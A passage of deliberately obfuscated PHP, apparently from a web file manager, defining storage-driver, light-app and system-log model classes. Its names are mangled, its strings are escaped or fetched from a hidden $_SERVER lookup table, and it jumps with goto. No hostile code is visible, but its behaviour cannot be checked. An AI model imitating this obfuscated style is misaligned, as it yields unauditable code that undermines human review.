getAutoName($Óııï•ƒ) { $×ã…‡”– = array_to_keyvalue($this->listData(), $_SERVER[Ôó‡è­ƒ][32]); if (!$×ã…‡”– || !isset($×ã…‡”–[$Óııï•ƒ])) { return $Óııï•ƒ; } for ($™¨ø±Áõ = 1; $™¨ø±Áõ < count($×ã…‡”–); $™¨ø±Áõ++) { $âÜ”Ëá® = $Óııï•ƒ . "\50{$™¨ø±Áõ}\51"; if (!isset($×ã…‡”–[$âÜ”Ëá®])) { return $âÜ”Ëá®; } } return $âÜ”Ëá®; } } goto Dôæš™×œÕ; d«°†Ï§—ç: define($_SERVER[Ôó‡è­ƒ][240], 1); define($_SERVER[Ôó‡è­ƒ][241], 0); define($_SERVER[Ôó‡è­ƒ][242], 2); goto aøµ¹ÀÉÚÓ; bÜÙÉ‡ŸëÍ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\163\164\157\162\141\147\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\163\151\x7a\x65\115\x61\x78", "\x73\x79\x73\x74\145\155", "\144\145\146\141\x75\154\164", "\x64\162\151\x76\x65\x72", "\x63\x6f\156\146\x69\x67"); public function listData($¯ú÷ˆ« = false, $ğÎÌ‚„Ñ = "\155\x6f\x64\x69\x66\x79\x54\x69\155\x65", $ÚÓ˜¨Õ = false) { $ß¬ê½‰ñ =& $_SERVER[Ôó‡è­ƒ]; $Şş½¢Û‘ = parent::listData($¯ú÷ˆ«, $ğÎÌ‚„Ñ, $ÚÓ˜¨Õ); if ($¯ú÷ˆ«) { return $Şş½¢Û‘; } $éŠƒ Ğ£ = $this->ioSizeUseGet(array_to_keyvalue($Şş½¢Û‘, $ß¬ê½‰ñ[12], $ß¬ê½‰ñ[396])); foreach ($Şş½¢Û‘ as $û³³Š® => $òŞşİ›Ê) { unset($Şş½¢Û‘[$û³³Š®][$ß¬ê½‰ñ[6]]); $Şş½¢Û‘[$û³³Š®][$ß¬ê½‰ñ[1812]] = isset($éŠƒ Ğ£[$òŞşİ›Ê[$ß¬ê½‰ñ[396]]]) ? $éŠƒ Ğ£[$òŞşİ›Ê[$ß¬ê½‰ñ[396]]] : 0; } return $Şş½¢Û‘; } public function ioSizeUseGet($ş…Æ¦) { $¦‹•ï‰û =& $_SERVER[Ôó‡è­ƒ]; if (!$ş…Æ¦) { return array(); } $µ¹Ùãå¼ = $¦‹•ï‰û[2127] . implode($¦‹•ï‰û[50], $ş…Æ¦); $’²”Ë„ï = Cache::get($µ¹Ùãå¼); if ($’²”Ë„ï) { return $’²”Ë„ï; } $¶¥âŠ‚ê = array($¦‹•ï‰û[815] => $¦‹•ï‰û[396], $¦‹•ï‰û[2128] => $¦‹•ï‰û[80]); $æ¢ÑŒª· = array($¦‹•ï‰û[815] => array($¦‹•ï‰û[7], $ş…Æ¦)); $’²”Ë„ï = Model($¦‹•ï‰û[787])->field($¶¥âŠ‚ê)->where($æ¢ÑŒª·)->group($¦‹•ï‰û[815])->select(); $’²”Ë„ï = array_to_keyvalue($’²”Ë„ï, $¦‹•ï‰û[396], $¦‹•ï‰û[80]); Cache::set($µ¹Ùãå¼, $’²”Ë„ï, 600); return $’²”Ë„ï; } public function getConfig($õ¡‰æ·) { $âÛ¨×Éª = parent::listData($õ¡‰æ·); return json_decode($âÛ¨×Éª[$_SERVER[Ôó‡è­ƒ][6]], !0); } public function update($ßÓÏóÒ, $ãº‡œï¾) { $ıàÔì– =& $_SERVER[Ôó‡è­ƒ]; $ÙäîÊ•É = $ãº‡œï¾[$ıàÔì–[32]]; $·¦«ˆÇê = array_to_keyvalue(parent::listData(), $ıàÔì–[32]); if (isset($·¦«ˆÇê[$ÙäîÊ•É]) && $·¦«ˆÇê[$ÙäîÊ•É][$ıàÔì–[396]] != $ßÓÏóÒ) { return !1; } if (isset($ãº‡œï¾[$ıàÔì–[2129]]) && $ãº‡œï¾[$ıàÔì–[2129]] == $ıàÔì–[89]) { $this->checkConfig($ãº‡œï¾); } unset($ãº‡œï¾[$ıàÔì–[2129]]); $ƒ„Ì×Òï = parent::update($ßÓÏóÒ, $ãº‡œï¾); if ($ƒ„Ì×Òï && $ãº‡œï¾[$ıàÔì–[37]]) { $æ™‰–°í = 0; foreach ($·¦«ˆÇê as $ÅÄÊÁäÕ) { if ($ÅÄÊÁäÕ[$ıàÔì–[37]] && $ÅÄÊÁäÕ[$ıàÔì–[396]] != $ßÓÏóÒ) { $æ™‰–°í = $ÅÄÊÁäÕ[$ıàÔì–[396]]; parent::update($ÅÄÊÁäÕ[$ıàÔì–[396]], array($ıàÔì–[37] => 0)); } } $this->updateBackup($ßÓÏóÒ, $æ™‰–°í); } return $ƒ„Ì×Òï; } public function add($Ş¦¶­…) { $î«æ™¥ª =& $_SERVER[Ôó‡è­ƒ]; $ı£ìàòÕ = array_to_keyvalue(parent::listData(), $î«æ™¥ª[32]); if (isset($ı£ìàòÕ[$Ş¦¶­…[$î«æ™¥ª[32]]])) { return !1; } $this->checkConfig($Ş¦¶­…); $õº‹Ğ» = parent::insert($Ş¦¶­…); if ($õº‹Ğ» && $Ş¦¶­…[$î«æ™¥ª[37]]) { foreach ($ı£ìàòÕ as $ìÔ—ÅŸè) { if ($ìÔ—ÅŸè[$î«æ™¥ª[37]]) { parent::update($ìÔ—ÅŸè[$î«æ™¥ª[396]], array($î«æ™¥ª[37] => 0)); } } } return $õº‹Ğ»; } public function updateBackup($´ÎñÈî, $×¹©Ó»Ã) { $Ëˆñß÷ =& $_SERVER[Ôó‡è­ƒ]; if (!$×¹©Ó»Ã) { return; } $™éòÚ = Model($Ëˆñß÷[747])->config(); if ($™éòÚ[$Ëˆñß÷[1625]] != $Ëˆñß÷[89] || $™éòÚ[$Ëˆñß÷[750]] != $×¹©Ó»Ã) { return; } $ÓÃ«ÎŞ = Model($Ëˆñß÷[768])->get($Ëˆñß÷[778]); $ÓÃ«ÎŞ = json_decode($ÓÃ«ÎŞ, !0); if (!$ÓÃ«ÎŞ) { return; } $ÓÃ«ÎŞ[$Ëˆñß÷[750]] = $´ÎñÈî; Model($Ëˆñß÷[768])->set(array($Ëˆñß÷[778] => $ÓÃ«ÎŞ)); } public function checkConfig(&$ÖÅÎ€Ò¯, $òŠöÀÈá = false) { $˜°’ÄĞ =& $_SERVER[Ôó‡è­ƒ]; $±¢èáØ– = strtolower($ÖÅÎ€Ò¯[$˜°’ÄĞ[96]]); $âÓ®Õ = json_decode($ÖÅÎ€Ò¯[$˜°’ÄĞ[6]], !0); foreach ($âÓ®Õ as $ƒÎÃ¨õù => $š©ÉÎğ) { $âÓ®Õ[$ƒÎÃ¨õù] = trim($š©ÉÎğ); } $âÓ®Õ[$˜°’ÄĞ[2130]] = rand_string(6); $©³®¹­ó = $GLOBALS[$˜°’ÄĞ[6]][$˜°’ÄĞ[90]][$˜°’ÄĞ[824]]; $ü·¡²Ï¾ = isset($©³®¹­ó[$±¢èáØ–]) ? $©³®¹­ó[$±¢èáØ–] : ucfirst($±¢èáØ–); $§¢î‹•Ä = $˜°’ÄĞ[74] . $ü·¡²Ï¾; if (!$ü·¡²Ï¾ || !class_exists($§¢î‹•Ä)) { if ($òŠöÀÈá) { return LNG($˜°’ÄĞ[2131]); } write_log(array($˜°’ÄĞ[2132], $ÖÅÎ€Ò¯, get_caller_info()), $˜°’ÄĞ[2133]); show_json(LNG($˜°’ÄĞ[2131]), !1, $ÖÅÎ€Ò¯); } $¾÷ò³Çö = new $§¢î‹•Ä($âÓ®Õ); if (in_array($±¢èáØ–, $¾÷ò³Çö->objectDriver)) { if (!$¾÷ò³Çö->isBucketCors() && !$¾÷ò³Çö->setBucketCors()) { $º——‡ç‰ = LNG($˜°’ÄĞ[2134]); $º——‡ç‰ .= $˜°’ÄĞ[2135] . LNG($˜°’ÄĞ[2136]); if ($òŠöÀÈá) { return $º——‡ç‰; } show_json($º——‡ç‰, !1); } } $”îéØ¥Ü = rtrim($âÓ®Õ[$˜°’ÄĞ[1179]], $˜°’ÄĞ[8]) . $˜°’ÄĞ[8]; $Ïæı•Œ™ = $¾÷ò³Çö->getPath($”îéØ¥Ü . $˜°’ÄĞ[1241]); if (!$¾÷ò³Çö->mkfile($Ïæı•Œ™)) { if ($òŠöÀÈá) { return LNG($˜°’ÄĞ[2134]); } show_json(LNG($˜°’ÄĞ[2134]), !1); } $âÓ®Õ[$˜°’ÄĞ[1179]] = $”îéØ¥Ü; $ÖÅÎ€Ò¯[$˜°’ÄĞ[6]] = json_encode($âÓ®Õ); $ÖÅÎ€Ò¯[$˜°’ÄĞ[96]] = $ü·¡²Ï¾; return !0; } public function driverListSystem() { $¸ãˆÖï“ =& $_SERVER[Ôó‡è­ƒ]; $Ñı›—æ÷ = parent::listData(); $Íåæ¼× = array(); foreach ($Ñı›—æ÷ as $¤òæ®ãœ) { unset($¤òæ®ãœ[$¸ãˆÖï“[197]], $¤òæ®ãœ[$¸ãˆÖï“[86]]); $¤òæ®ãœ[$¸ãˆÖï“[6]] = json_decode($¤òæ®ãœ[$¸ãˆÖï“[6]], !0); $Íåæ¼×[] = $¤òæ®ãœ; } return $Íåæ¼×; } public function defaultDriver() { $Àüè™İ² =& $_SERVER[Ôó‡è­ƒ]; $Ñ¿÷ÓÄà = parent::listData(); $›Õ€´š” = array_filter_by_field($Ñ¿÷ÓÄà, $Àüè™İ²[37], 1); $›Õ€´š” = $›Õ€´š”[0]; if ($›Õ€´š”) { $›Õ€´š”[$Àüè™İ²[6]] = json_decode($›Õ€´š”[$Àüè™İ²[6]], !0); } return $›Õ€´š”; } public function driverInfo($îÉ’¶Ğé) { $Ú¦•ß¡ =& $_SERVER[Ôó‡è­ƒ]; $ï©—åÚ = array_to_keyvalue(parent::listData(), $Ú¦•ß¡[396]); if (!isset($ï©—åÚ[$îÉ’¶Ğé])) { return !1; } $öÏÄ²â = $ï©—åÚ[$îÉ’¶Ğé]; $öÏÄ²â[$Ú¦•ß¡[6]] = json_decode($öÏÄ²â[$Ú¦•ß¡[6]], !0); return $öÏÄ²â; } public function remove($¯¨éÖºà) { $this->removeShareItems($¯¨éÖºà); return parent::remove($¯¨éÖºà); } public function removeWithFile($Ñ‚â”“, $ÂÉ·ˆ) { $µì‚›Ú™ =& $_SERVER[Ôó‡è­ƒ]; $¥ˆ° Çğ = array($µì‚›Ú™[815] => $Ñ‚â”“); $‡Øœ¾Ì = Model($µì‚›Ú™[466])->where($¥ˆ° Çğ)->count(); $Çù­øäå = Model($µì‚›Ú™[466])->where($¥ˆ° Çğ)->sum($µì‚›Ú™[80]); $ØŞ–‰µ = $ÂÉ·ˆ . $µì‚›Ú™[2137] . $Ñ‚â”“; $ÛÛ•²òÀ = LNG($ÂÉ·ˆ == $µì‚›Ú™[550] ? $µì‚›Ú™[2138] : $µì‚›Ú™[2139]); $ı¨¸ìÕ¡ = new TaskFileTransfer($ØŞ–‰µ, $µì‚›Ú™[2133], $‡Øœ¾Ì, $ÛÛ•²òÀ . "\x28{$Ñ‚â”“}\51"); $ı¨¸ìÕ¡->task[$µì‚›Ú™[761]] = (double) $Çù­øäå; $í‰¯„Í› = KodIO::defaultDriver(); $ÛœØã€Ú = $í‰¯„Í›[$µì‚›Ú™[396]]; $“ãµòÄ = "\x7b\x69\157\x3a{$ÛœØã€Ú}\175\x2f"; $İºÜºï„ = !0; $µÓÏĞ‹ = array(); $ö®Ş® = Model($µì‚›Ú™[196])->where($¥ˆ° Çğ)->field($µì‚›Ú™[2140])->select(); foreach ($ö®Ş® as $‹„¶²ø„) { $×­¡šÕ = $‹„¶²ø„[$µì‚›Ú™[78]]; $áüèôÖ¡ = $“ãµòÄ . str_replace("\173\x69\x6f\72{$Ñ‚â”“}\x7d\57", $µì‚›Ú™[12], $×­¡šÕ); if (!IO::exist($×­¡šÕ)) { $µÓÏĞ‹[] = $‹„¶²ø„[$µì‚›Ú™[463]]; $ı¨¸ìÕ¡->updateFileEnd($‹„¶²ø„[$µì‚›Ú™[32]], $‹„¶²ø„[$µì‚›Ú™[80]]); continue; } if (IO::exist($áüèôÖ¡)) { $ı¨¸ìÕ¡->updateFileEnd($‹„¶²ø„[$µì‚›Ú™[32]], $‹„¶²ø„[$µì‚›Ú™[80]]); continue; } if (!IO::move($×­¡šÕ, get_path_father($áüèôÖ¡))) { $İºÜºï„ = !1; break; } $¥ˆ° Çğ = array($µì‚›Ú™[463] => $‹„¶²ø„[$µì‚›Ú™[463]]); $ôâ‹Ø¼ó = array($µì‚›Ú™[815] => $ÛœØã€Ú, $µì‚›Ú™[78] => $áüèôÖ¡); Model($µì‚›Ú™[196])->where($¥ˆ° Çğ)->save($ôâ‹Ø¼ó); } $this->removeByFileID($µÓÏĞ‹); if (!$İºÜºï„) { $ı¨¸ìÕ¡->stop($ØŞ–‰µ); return !1; } $ı¨¸ìÕ¡->end(); if ($ÂÉ·ˆ == $µì‚›Ú™[1792]) { $this->remove($Ñ‚â”“); } } public function progress($¢¢úß÷ë, $ÜÁù—È¸) { return Task::get($ÜÁù—È¸ . $_SERVER[Ôó‡è­ƒ][2137] . $¢¢úß÷ë); } private function removeByFileID($ñ×¾Ìã£ = array()) { $¢şõ•á =& $_SERVER[Ôó‡è­ƒ]; if (empty($ñ×¾Ìã£)) { return; } $äÖ§ƒå¥ = array($¢şõ•á[463] => array($¢şõ•á[7], $ñ×¾Ìã£)); $ò ƒóğß = Model($¢şõ•á[1325])->where($äÖ§ƒå¥)->field($¢şõ•á[399])->select(); if (!$ò ƒóğß) { return; } $ò ƒóğß = array_to_keyvalue($ò ƒóğß, $¢şõ•á[12], $¢şõ•á[399]); foreach ($ò ƒóğß as $õÂçİ˜Ğ) { Model($¢şõ•á[413])->removeNow($õÂçİ˜Ğ, !1); } } private function removeShareItems($±…Èã‹) { $ØÖ¼Âîİ =& $_SERVER[Ôó‡è­ƒ]; $ìÑƒş“Ä = "\x7b\x69\157\72{$±…Èã‹}\x7d\57"; $¤Å””Â = array($ØÖ¼Âîİ[399] => 0, $ØÖ¼Âîİ[1174] => array($ØÖ¼Âîİ[382], "{$ìÑƒş“Ä}\x25")); $±ôõ†˜† = Model($ØÖ¼Âîİ[1803])->where($¤Å””Â)->field($ØÖ¼Âîİ[484])->select(); if (empty($±ôõ†˜†)) { return; } $Š¸Ã¤éÔ = array_to_keyvalue($±ôõ†˜†, $ØÖ¼Âîİ[12], $ØÖ¼Âîİ[484]); Model($ØÖ¼Âîİ[594])->remove($Š¸Ã¤éÔ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x4c\151\x67\x68\164\x41\160\160"; public $modelType = "\123\171\x73\x74\x65\155\117\x70\x74\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\x67\162\157\x75\160", "\144\145\x73\x63", "\143\x6f\x6e\164\145\x6e\164"); public function listData($Ïó·„Ë = false, $«¨Á¾±à = "\155\x6f\x64\x69\146\171\x54\151\155\x65", $ßôğ¶â° = true) { return parent::listData($Ïó·„Ë, $«¨Á¾±à, $ßôğ¶â°); } public function remove($©ßÌ©) { $àÃ¾å µ = $this->findByName($©ßÌ©); if (!$àÃ¾å µ) { return !1; } return parent::remove($àÃ¾å µ[$_SERVER[Ôó‡è­ƒ][396]]); } public function add($İâÚß‹Ü) { if ($this->findByName($İâÚß‹Ü[$_SERVER[Ôó‡è­ƒ][32]])) { return !1; } return parent::insert($İâÚß‹Ü); } public function update($ªÑÍ¹©Í, $Öö”îË©) { $¡Ô˜ôú =& $_SERVER[Ôó‡è­ƒ]; $›†­¯à‚ = $this->findByName($ªÑÍ¹©Í); $Úä‡ˆÄ = $this->findByName($Öö”îË©[$¡Ô˜ôú[32]]); if (!$›†­¯à‚ || $Úä‡ˆÄ && $Úä‡ˆÄ[$¡Ô˜ôú[396]] != $›†­¯à‚[$¡Ô˜ôú[396]]) { return !1; } return parent::update($›†­¯à‚[$¡Ô˜ôú[396]], $Öö”îË©); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\151\x6d\145", "\164\151\155\x65", "\x69\156\163\x65\162\x74", "\146\165\x6e\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ø·´±á£ =& $_SERVER[Ôó‡è­ƒ]; return array($ø·´±á£[2141] => LNG($ø·´±á£[2142]), $ø·´±á£[2143] => LNG($ø·´±á£[2144]), $ø·´±á£[1766] => LNG($ø·´±á£[2145]), $ø·´±á£[2146] => LNG($ø·´±á£[2147]), $ø·´±á£[2148] => LNG($ø·´±á£[2149]), $ø·´±á£[2150] => LNG($ø·´±á£[2151]), $ø·´±á£[2152] => LNG($ø·´±á£[2153]), $ø·´±á£[1796] => LNG($ø·´±á£[2153]), $ø·´±á£[1797] => LNG($ø·´±á£[2154]), $ø·´±á£[2155] => LNG($ø·´±á£[2156]), $ø·´±á£[2157] => LNG($ø·´±á£[2158]), $ø·´±á£[2159] => LNG($ø·´±á£[2160]), $ø·´±á£[2161] => LNG($ø·´±á£[2162]), $ø·´±á£[1794] => LNG($ø·´±á£[2163]), $ø·´±á£[2164] => LNG($ø·´±á£[2165]), $ø·´±á£[1801] => LNG($ø·´±á£[2166]), $ø·´±á£[2167] => LNG($ø·´±á£[2168]), $ø·´±á£[2169] => LNG($ø·´±á£[2170]), $ø·´±á£[2171] => LNG($ø·´±á£[2172]), $ø·´±á£[2173] => LNG($ø·´±á£[2174]), $ø·´±á£[1804] => LNG($ø·´±á£[2175]), $ø·´±á£[1805] => LNG($ø·´±á£[2176]), $ø·´±á£[2177] => LNG($ø·´±á£[2178]), $ø·´±á£[2179] => LNG($ø·´±á£[2180]), $ø·´±á£[2181] => LNG($ø·´±á£[2182]), $ø·´±á£[1799] => LNG($ø·´±á£[2183]), $ø·´±á£[2184] => LNG($ø·´±á£[2185]), $ø·´±á£[1798] => LNG($ø·´±á£[2186]), $ø·´±á£[2187] => LNG($ø·´±á£[2188]), $ø·´±á£[2189] => LNG($ø·´±á£[2190]), $ø·´±á£[2191] => LNG($ø·´±á£[2192]), $ø·´±á£[2193] => LNG($ø·´±á£[2193]), $ø·´±á£[2194] => LNG($ø·´±á£[1770]), $ø·´±á£[2195] => LNG($ø·´±á£[2196]), $ø·´±á£[2197] => LNG($ø·´±á£[2198]), $ø·´±á£[2199] => LNG($ø·´±á£[2200]), $ø·´±á£[2201] => LNG($ø·´±á£[2202]), $ø·´±á£[2203] => LNG($ø·´±á£[2204]), $ø·´±á£[2205] => LNG($ø·´±á£[2205]), $ø·´±á£[2206] => LNG($ø·´±á£[2207]), $ø·´±á£[2208] => LNG($ø·´±á£[2209]), $ø·´±á£[2210] => LNG($ø·´±á£[2211]), $ø·´±á£[2212] => LNG($ø·´±á£[2213]), $ø·´±á£[2214] => LNG($ø·´±á£[2215]), $ø·´±á£[2216] => LNG($ø·´±á£[2217])); } private function typeFile() { $¯½‹´¸ù =& $_SERVER[Ôó‡è­ƒ]; $‡»˜ˆ = array($¯½‹´¸ù[1801] => array($¯½‹´¸ù[1802]), $¯½‹´¸ù[2159] => array($¯½‹´¸ù[2218]), $¯½‹´¸ù[2161] => array($¯½‹´¸ù[2219]), $¯½‹´¸ù[1794] => array($¯½‹´¸ù[1795]), $¯½‹´¸ù[2169] => array(), $¯½‹´¸ù[2171] => array(), $¯½‹´¸ù[2173] => array(), $¯½‹´¸ù[1804] => array($¯½‹´¸ù[1806]), $¯½‹´¸ù[1805] => array($¯½‹´¸ù[1806]), $¯½‹´¸ù[2177] => array($¯½‹´¸ù[2220]), $¯½‹´¸ù[2179] => array($¯½‹´¸ù[2220]), $¯½‹´¸ù[2181] => array($¯½‹´¸ù[2221]), $¯½‹´¸ù[2167] => array($¯½‹´¸ù[2222]), $¯½‹´¸ù[1799] => array($¯½‹´¸ù[2223]), $¯½‹´¸ù[2184] => array($¯½‹´¸ù[2224]), $¯½‹´¸ù[1798] => array($¯½‹´¸ù[1800])); return $‡»˜ˆ; } private function typeAll() { $ıËí­Üû =& $_SERVER[Ôó‡è­ƒ]; $Öä€•Ôµ = $this->typeList; $÷ßÚ–§ = array_filter($this->typeFile()); foreach ($÷ßÚ–§ as $·ëœøçÊ => $­€¥óˆ«) { $Öä€•Ôµ[$­€¥óˆ«[0]] = $Öä€•Ôµ[$·ëœøçÊ]; } $Öä€•Ôµ[$ıËí­Üû[1806]] = LNG($ıËí­Üû[2225]); $Öä€•Ôµ[$ıËí­Üû[2220]] = LNG($ıËí­Üû[2226]); return $Öä€•Ôµ; } public function addLog($ñÎ“¾Á , $ãŸ¨Ëß = array()) { $ÆÃÊù”£ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->typeList[$ñÎ“¾Á ])) { return; } $Ï£¸ØÓÓ = defined($ÆÃÊù”£[470]) && USER_ID ? USER_ID : (isset($ãŸ¨Ëß[$ÆÃÊù”£[1655]]) ? $ãŸ¨Ëß[$ÆÃÊù”£[1655]] : 0); if (!$Ï£¸ØÓÓ) { $Ï£¸ØÓÓ = (int) Session::get($ÆÃÊù”£[1957]); } $ùÑ˜†¯Š = get_client_ip(); if (!$ãŸ¨Ëß || strlen(json_encode($ãŸ¨Ëß)) >= 1024) { $ãŸ¨Ëß = array($ÆÃÊù”£[2227] => $ùÑ˜†¯Š); } else { if (is_array($ãŸ¨Ëß)) { $ãŸ¨Ëß[$ÆÃÊù”£[2227]] = $ùÑ˜†¯Š; } else { $ãŸ¨Ëß = array($ÆÃÊù”£[1191] => $ãŸ¨Ëß, $ÆÃÊù”£[2227] => $ùÑ˜†¯Š); } } $ãŸ¨Ëß = array($ÆÃÊù”£[1645] => Session::sign(), $ÆÃÊù”£[1646] => $Ï£¸ØÓÓ, $ÆÃÊù”£[33] => $ñÎ“¾Á , $ÆÃÊù”£[1648] => json_encode($ãŸ¨Ëß)); parent::add($ãŸ¨Ëß); } public function remove($Æ±àŞš) { $this->where(array($_SERVER[Ôó‡è­ƒ][416] => $Æ±àŞš))->delete(); } private function _makeOrder($›ûÍ™µò = '') { $ëÏ§ÚşÍ =& $_SERVER[Ôó‡è­ƒ]; $‚à½ì˜µ = $ëÏ§ÚşÍ[197]; $òÃ·Ç«ê = array($ëÏ§ÚşÍ[444] => $ëÏ§ÚşÍ[445], $ëÏ§ÚşÍ[446] => $ëÏ§ÚşÍ[447]); $Ë×Û­®° = Input::get($ëÏ§ÚşÍ[452], $ëÏ§ÚşÍ[7], $ëÏ§ÚşÍ[1989], array($ëÏ§ÚşÍ[1913], $ëÏ§ÚşÍ[446])); $Ë×Û­®° = $òÃ·Ç«ê[$Ë×Û­®°]; $›ûÍ™µò = $›ûÍ™µò . "{$‚à½ì˜µ}\x20{$Ë×Û­®°}"; return $this->order($›ûÍ™µò); } public function get($•şà¾À‡ = '') { $àÔüîöš =& $_SERVER[Ôó‡è­ƒ]; if (!$•şà¾À‡) { show_json(array()); } $ÜÏÍôİ… = array(); if ($•şà¾À‡[$àÔüîöš[1655]]) { $ÜÏÍôİ…[$àÔüîöš[1655]] = $•şà¾À‡[$àÔüîöš[1655]]; } if (isset($•şà¾À‡[$àÔüîöš[759]])) { $È›¿òü— = $•şà¾À‡[$àÔüîöš[759]]; $Àßãş‡Ş = isset($•şà¾À‡[$àÔüîöš[492]]) ? $•şà¾À‡[$àÔüîöš[492]] : time(); $ÜÏÍôİ…[$àÔüîöš[197]] = array($àÔüîöš[332], array($È›¿òü—, $Àßãş‡Ş)); } if ($•şà¾À‡[$àÔüîöš[33]]) { $°æ£¡¸í = explode($àÔüîöš[50], $•şà¾À‡[$àÔüîöš[33]]); $Õ¬ÓËÖ” = $this->typeFile(); $ãğ«†¯å = array(); foreach ($°æ£¡¸í as $ü§à§) { $ãğ«†¯å[] = $ü§à§; if (isset($Õ¬ÓËÖ”[$ü§à§])) { $ãğ«†¯å = array_merge($ãğ«†¯å, $Õ¬ÓËÖ”[$ü§à§]); } } $ãğ«†¯å = array_unique($ãğ«†¯å); if ($ãğ«†¯å) { $ÜÏÍôİ…[$àÔüîöš[33]] = array($àÔüîöš[7], $ãğ«†¯å); } } else { $ÜÏÍôİ…[$àÔüîöš[33]] = array($àÔüîöš[2228], $àÔüîöš[2229]); } if (!empty($•şà¾À‡[$àÔüîöš[2227]])) { $ÜÏÍôİ…[$àÔüîöš[447]] = array($àÔüîöš[382], "\x25{$•şà¾À‡[$àÔüîöš[2227]]}\x25"); } $£‰ ¾¶° = $this->_makeOrder()->where($ÜÏÍôİ…)->selectPage(); if (empty($£‰ ¾¶°[$àÔüîöš[368]])) { show_json(array(), !0, $£‰ ¾¶°[$àÔüîöš[365]]); } $£‰ ¾¶°[$àÔüîöš[368]] = $this->logList($£‰ ¾¶°[$àÔüîöš[368]]); return $£‰ ¾¶°; } private function ipAddress(&$ğÙ€Àµ‘) { $å¶âÔéö =& $_SERVER[Ôó‡è­ƒ]; if (!empty($ğÙ€Àµ‘[$å¶âÔéö[2227]])) { $Âàë¥ĞŠ = IpLocation::get($ğÙ€Àµ‘[$å¶âÔéö[2227]]); } else { $Âàë¥ĞŠ = LNG($å¶âÔéö[2230]); } $ğÙ€Àµ‘[$å¶âÔéö[2231]] = $Âàë¥ĞŠ; } private function descZipDownload($â÷ï‰Ò, &$ÁãÙ†Íè) { $Ñ·‡èÀ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($â÷ï‰Ò[$Ñ·‡èÀ[2232]])) { return; } $²‹— = json_decode($â÷ï‰Ò[$Ñ·‡èÀ[2232]], !0); foreach ($²‹— as $ˆ÷ˆ½ö) { try { $Ìç’îÒ£ = IO::infoFull($ˆ÷ˆ½ö[$Ñ·‡èÀ[78]]); } catch (Exception $±©ÁŠ˜‰) { continue; } $â÷ï‰Ò[$Ñ·‡èÀ[78]] = $ˆ÷ˆ½ö[$Ñ·‡èÀ[78]]; $ÁãÙ†Íè[] = $â÷ï‰Ò[$Ñ·‡èÀ[399]] = $Ìç’îÒ£[$Ñ·‡èÀ[399]]; $ÁãÙ†Íè[] = $â÷ï‰Ò[$Ñ·‡èÀ[2043]] = $Ìç’îÒ£[$Ñ·‡èÀ[494]]; break; } return $â÷ï‰Ò; } private function getSourceList(&$¡×Üˆ»¯) { $ŒÇû­‚ =& $_SERVER[Ôó‡è­ƒ]; $˜Ç¡¶ˆ­ = array(); foreach ($¡×Üˆ»¯ as $Ò’‚Ó·å => $§àêÜú) { $õÛˆø = json_decode($§àêÜú[$ŒÇû­‚[447]], !0); if ($§àêÜú[$ŒÇû­‚[33]] == $ŒÇû­‚[1797]) { $õÛˆø = $this->descZipDownload($õÛˆø, $˜Ç¡¶ˆ­); $¡×Üˆ»¯[$Ò’‚Ó·å][$ŒÇû­‚[447]] = json_encode($õÛˆø); continue; } if (strpos($§àêÜú[$ŒÇû­‚[33]], $ŒÇû­‚[2045]) !== 0) { if (!isset($õÛˆø[$ŒÇû­‚[78]]) || strpos($§àêÜú[$ŒÇû­‚[33]], $ŒÇû­‚[2233]) !== 0) { continue; } try { $‚±»­´ = IO::infoFull($õÛˆø[$ŒÇû­‚[78]]); } catch (Exception $õ Ş‹²Ï) { continue; } $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[399]] = $‚±»­´[$ŒÇû­‚[399]]; $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[2043]] = $‚±»­´[$ŒÇû­‚[494]]; $¡×Üˆ»¯[$Ò’‚Ó·å][$ŒÇû­‚[447]] = json_encode($õÛˆø); continue; } $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[399]]; $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[2043]]; if ($õÛˆø[$ŒÇû­‚[33]] == $ŒÇû­‚[550]) { $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[447]][$ŒÇû­‚[1158]]; $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[447]][$ŒÇû­‚[1159]]; } if ($õÛˆø[$ŒÇû­‚[33]] == $ŒÇû­‚[2052]) { $˜Ç¡¶ˆ­[] = $õÛˆø[$ŒÇû­‚[447]][$ŒÇû­‚[399]]; } } if (!$˜Ç¡¶ˆ­) { return array(); } return Model($ŒÇû­‚[823])->sourceListInfo($˜Ç¡¶ˆ­, !0); } private function logList($û³Âòáß) { $ÁÑÇû¹È =& $_SERVER[Ôó‡è­ƒ]; $ë¶Å¨ö• = array_to_keyvalue($û³Âòáß, $ÁÑÇû¹È[12], $ÁÑÇû¹È[1655]); $½Õè€¸ = Model($ÁÑÇû¹È[537])->userListInfo(array_unique($ë¶Å¨ö•)); $Éö‰¦ä = $this->getSourceList($û³Âòáß); $Î™ãùğ = $this->typeAll(); $Øİ¶òö÷ = array(); $«ñöÊğ = array(); foreach ($û³Âòáß as $Ò­ğÎ‰ => $¾ÌÑ·¾) { $¦§šàŒ— = $¾ÌÑ·¾[$ÁÑÇû¹È[33]]; $¤¨¦õ = isset($½Õè€¸[$¾ÌÑ·¾[$ÁÑÇû¹È[1655]]]) ? $½Õè€¸[$¾ÌÑ·¾[$ÁÑÇû¹È[1655]]] : !1; $€›“€ = strpos($¦§šàŒ—, $ÁÑÇû¹È[2234]) === 0 ? LNG($ÁÑÇû¹È[2235]) : LNG($ÁÑÇû¹È[2230]); $¾ÌÑ·¾[$ÁÑÇû¹È[32]] = isset($¤¨¦õ[$ÁÑÇû¹È[32]]) ? $¤¨¦õ[$ÁÑÇû¹È[32]] : LNG($ÁÑÇû¹È[2230]); $¾ÌÑ·¾[$ÁÑÇû¹È[534]] = isset($¤¨¦õ[$ÁÑÇû¹È[534]]) ? 